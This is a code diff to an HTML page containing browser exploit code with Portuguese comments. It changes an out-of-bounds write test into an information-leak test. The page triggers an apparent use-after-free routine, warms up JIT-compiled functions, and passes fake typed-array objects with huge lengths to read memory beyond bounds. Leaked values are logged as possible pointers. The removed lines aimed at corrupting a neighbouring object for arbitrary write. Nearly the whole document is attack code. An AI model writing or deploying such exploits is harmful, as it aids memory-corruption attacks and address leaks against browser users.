@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><title>JIT OOB Test</title></head>
+<head><title>JIT Info Leak</title></head>
 <body>
-<button onclick="test()">Test JIT OOB</button>
+<button onclick="test()">Test JIT Leak</button>
 <pre id="log"></pre>
 
 <script>
@@ -24,108 +24,108 @@ async function triggerUAF() {
 }
 
 async function test() {
-  log("=== JIT OOB EXPLOITATION ===\n");
+  log("=== JIT INFO LEAK ===\n");
   
   await triggerUAF();
   
   window.addEventListener('popstate', (e) => {
     if(e.state && e.state.index >= 40) {
-      log("[RACE] Testing JIT OOB...\n");
+      log("[RACE] Testing JIT info leak...\n");
       
-      // Função que JIT vai compilar
-      function jit_write(arr, idx, val) {
-        arr[idx] = val;
+      // Função JIT
+      function jit_read(arr, idx) {
         return arr[idx];
       }
       
-      // Warm up com Uint32Array
+      // Warm up
       const warm = new Uint32Array(100);
       for(let i=0; i<10000; i++) {
-        jit_write(warm, i % 100, i);
+        jit_read(warm, i % 100);
       }
       
-      log("JIT compiled (expects Uint32Array)\n");
+      log("JIT compiled\n");
       
-      // CRITICAL: Criar fake array com length ENORME
+      // CRITICAL: Fake array para ler além
       const fake = {
-        0: 0,
-        1: 0,
-        2: 0,
-        3: 0,
-        length: 0x1000  // 4096 elements (mas só temos 4!)
+        0: 0, 1: 0, 2: 0, 3: 0,
+        length: 0x10000  // Huge fake length
       };
       fake.__proto__ = Uint32Array.prototype;
       
-      log("Fake Uint32Array created:");
-      log("  Actual properties: 4 (0-3)");
-      log("  Fake length: " + fake.length + "\n");
+      log("Fake array with length: " + fake.length);
+      log("Reading beyond bounds:\n");
       
-      // TEST: Escrever além dos limites reais
-      log("Testing OOB writes:\n");
+      // Ler 100 valores além do objeto
+      const leaked = [];
       
-      const testIndices = [4, 10, 50, 100, 500, 1000];
-      
-      testIndices.forEach(idx => {
-        try {
-          const marker = 0xDEAD0000 + idx;
-          jit_write(fake, idx, marker);
-          
-          log(`  [${idx}] Write 0x${marker.toString(16)}`);
-          
-          // Tentar ler de volta
-          const readback = fake[idx];
-          
-          if(readback !== undefined) {
-            log(`       Read: 0x${readback.toString(16)}`);
-            
-            if(readback === marker) {
-              log(`       🚨 OOB CONFIRMED! Write+Read at index ${idx}!`);
-            }
-          } else {
-            log(`       Read: undefined (expected)`);
-          }
-          
-        } catch(err) {
-          log(`  [${idx}] Exception: ${err.message}`);
-        }
-      });
-      
-      log("\n" + "=".repeat(60));
-      
-      // CRITICAL TEST: Verificar se escreveu FORA do objeto
-      log("\nChecking if writes escaped object bounds:\n");
-      
-      // Criar objeto adjacente na memória
-      const neighbor = {
-        marker: "NEIGHBOR",
-        id: 12345,
-        data: [1, 2, 3, 4, 5]
-      };
-      
-      log("Created neighbor object:");
-      log("  neighbor.marker: " + neighbor.marker);
-      log("  neighbor.id: " + neighbor.id);
-      log("  neighbor.data: [" + neighbor.data + "]\n");
-      
-      // Escrever MUITOS valores via fake array
-      log("Writing 100 values via JIT confusion...");
       for(let i=4; i<100; i++) {
         try {
-          jit_write(fake, i, 0xBEEF0000 + i);
+          const val = jit_read(fake, i);
+          
+          if(val !== undefined && val !== 0) {
+            leaked.push({ index: i, value: val });
+            log(`  [${i}] = 0x${val.toString(16).padStart(8, '0')}`);
+          }
         } catch(e) {}
       }
       
-      log("\nChecking neighbor after writes:");
-      log("  neighbor.marker: " + neighbor.marker);
-      log("  neighbor.id: " + neighbor.id);
-      log("  neighbor.data: [" + neighbor.data + "]");
+      log("\n" + "=".repeat(60));
+      log("LEAKED VALUES: " + leaked.length);
       
-      // Se neighbor foi corrompido, temos arb write!
-      if(neighbor.marker !== "NEIGHBOR" || 
-         neighbor.id !== 12345 ||
-         neighbor.data.length !== 5) {
-        log("\n🚨🚨🚨 NEIGHBOR CORRUPTED! 🚨🚨🚨");
-        log("🚨 ARBITRARY WRITE ACHIEVED! 🚨");
+      if(leaked.length > 0) {
+        log("\n🚨 INFO LEAK CONFIRMED! 🚨");
+        log("\nPotential pointers/addresses:");
+        
+        leaked.forEach(item => {
+          // Valores grandes podem ser ponteiros
+          if(item.value > 0x10000000) {
+            log(`  Index ${item.index}: 0x${item.value.toString(16)} (possible pointer!)`);
+          }
+        });
+      }
+      
+      // BONUS: Tentar leak via Float64Array
+      log("\n" + "=".repeat(60));
+      log("FLOAT64 INTERPRETATION:\n");
+      
+      function jit_read_float(arr, idx) {
+        return arr[idx];
+      }
+      
+      // Warm up Float64
+      const warmFloat = new Float64Array(100);
+      for(let i=0; i<10000; i++) {
+        jit_read_float(warmFloat, i % 100);
+      }
+      
+      const fakeFloat = {
+        0: 0, 1: 0, 2: 0, 3: 0,
+        length: 0x1000
+      };
+      fakeFloat.__proto__ = Float64Array.prototype;
+      
+      log("Reading as Float64 (pointer leak):\n");
+      
+      for(let i=4; i<50; i++) {
+        try {
+          const val = jit_read_float(fakeFloat, i);
+          
+          if(val !== undefined && !isNaN(val) && val !== 0) {
+            // Convert float to hex (pointer representation)
+            const buffer = new ArrayBuffer(8);
+            const floatView = new Float64Array(buffer);
+            const intView = new Uint32Array(buffer);
+            
+            floatView[0] = val;
+            const low = intView[0];
+            const high = intView[1];
+            
+            if(high !== 0) {  // Likely a pointer
+              log(`  [${i}] Float: ${val}`);
+              log(`       Hex: 0x${high.toString(16).padStart(8,'0')}${low.toString(16).padStart(8,'0')}`);
+            }
+          }
+        } catch(e) {}
       }
     }
   });
